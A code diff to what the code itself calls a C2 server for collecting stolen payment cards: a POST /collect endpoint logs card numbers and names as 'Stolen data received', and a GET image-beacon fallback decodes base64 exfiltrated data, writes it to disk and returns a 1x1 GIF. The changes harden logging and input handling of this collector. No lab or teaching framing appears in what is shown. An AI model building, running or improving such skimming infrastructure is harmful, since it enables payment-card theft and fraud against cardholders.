@@ -71,10 +71,15 @@ function sanitizeField(value, fieldName) {
 }
 
 // Sanitize for logging: Prevent log injection (newline forging and contorl chars)
-function sanitizeForLog(val) {
-  if (val === undefined || val === null) return 'N/A';
-  // Remove all ASCII control characters (includes \r and \n) and trim
-  return String(val).replace(/[\x00-\x1F\x7F]/g, ' ').trim() || 'N/A';
+function sanitizeForLog(value, fieldName) {
+  if (value === undefined || value === null) return 'N/A'
+  const withoutNewlines = String(value).replace(/[\r\n]/g, ' ')
+  const sanitized = sanitizeField(withoutNewlines, fieldName)
+  if (!sanitized) return 'N/A'
+  return String(sanitized)
+    .replace(/[\r\n]/g, ' ')
+    .replace(/[^a-zA-Z0-9 .,;:_@*#\/\-]/g, '?')
+    .trim() || 'N/A'
 }
 
 // Sanitize request body: only keep allowed fields, sanitize values
@@ -113,9 +118,10 @@ app.post('/collect', collectLimiter, async (req, res) => {
   const body = sanitizeBody(rawBody)
 
   // Safe logging (prevent log injection)
-  const safeCardNumber = sanitizeForLog(body.card_number)
-  const safeName = sanitizeForLog(body.card_name)
-  const safeSource = sanitizeForLog(body.source || 'unknown')
+  const safeCardNumber = sanitizeForLog(body.card_number, 'card_number')
+  const safeName       = sanitizeForLog(body.card_name,   'card_name')
+  const safeSource     = sanitizeForLog(body.source || 'unknown', 'source')
+
 
   console.log(`\n[C2] 🎯 Stolen data received at ${ts}`)
   console.log(`[C2]   Card: ${safeCardNumber}`)
@@ -164,49 +170,49 @@ app.post('/collect', collectLimiter, async (req, res) => {
 // GET /collect — image beacon fallback
 // ──────────────────────────────────────────────────
 app.get('/collect', collectLimiter, async (req, res) => {
-  if (req.query.d) {
-    // Basic size validation for base64 payload (10KB limit)
-    if (req.query.d.length > 10240) {
-      const payloadLength = Math.max(0, Number(req.query.d.length) || 0)
-      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${payloadLength} bytes)`)
+  // Extract into a typed local variable — req.query.d can be string | string[] | undefined
+  // We only process when it is confirmed to be a non-empty string
+  const d = req.query.d
+
+  if (typeof d === 'string' && d.length > 0) {
+
+    // Size validation for base64 payload (10KB limit)
+    if (d.length > 10240) {
+      console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${d.length} bytes)`)
+
     } else {
-      // Basic size validation for base64 payload (10KB limit)
-      if (req.query.d.length > 10240) {
-        console.warn(`[C2] ⚠️  Rejected oversized beacon payload (${req.query.d.length} bytes)`)
-      } else {
+      try {
+        await ensureDataDir()
+        const decoded = Buffer.from(d, 'base64').toString('utf8')
+
+        // Ensure decoded data is valid JSON
+        let parsed
         try {
-          await ensureDataDir()
-          const decoded = Buffer.from(req.query.d, 'base64').toString('utf8')
+          parsed = JSON.parse(decoded)
+        } catch (je) {
+          console.warn('[C2] ⚠️  Invalid JSON in beacon payload')
+        }
 
-          // Ensure decoded data is valid JSON
-          let parsed;
-          try {
-            parsed = JSON.parse(decoded)
-          } catch (je) {
-            console.warn('[C2] ⚠️  Invalid JSON in beacon payload')
+        if (parsed) {
+          const sanitizedData = sanitizeBody(parsed)
+          const record = {
+            id: `beacon-${Date.now()}`,
+            timestamp: new Date().toISOString(),
+            data: sanitizedData
           }
-
-          if (parsed) {
-            // Sanitize decoded data before writing to disk
-            const sanitizedData = sanitizeBody(parsed)
-            const record = {
-              id: `beacon-${Date.now()}`,
-              timestamp: new Date().toISOString(),
-              data: sanitizedData
-            }
-            await fs.writeFile(
-              path.join(DATA_DIR, `${record.id}.json`),
-              JSON.stringify(record, null, 2)
-            )
-          }
-        } catch (e) { /* silent */ }
-      }
+          await fs.writeFile(
+            path.join(DATA_DIR, `${record.id}.json`),
+            JSON.stringify(record, null, 2)
+          )
+        }
+      } catch (e) { /* silent — beacon must not error the response */ }
     }
   }
-  // Return 1x1 transparent GIF
+
+  // Always return 1x1 transparent GIF regardless of payload result
   const gif = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64')
-  res.writeHead(200, { 'Content-Type': 'image/gif', 'Content-Length': gif.length })
-  res.end(gif)
+  res.set('Content-Type', 'image/gif')
+  res.send(gif)
 })
 
 // ──────────────────────────────────────────────────
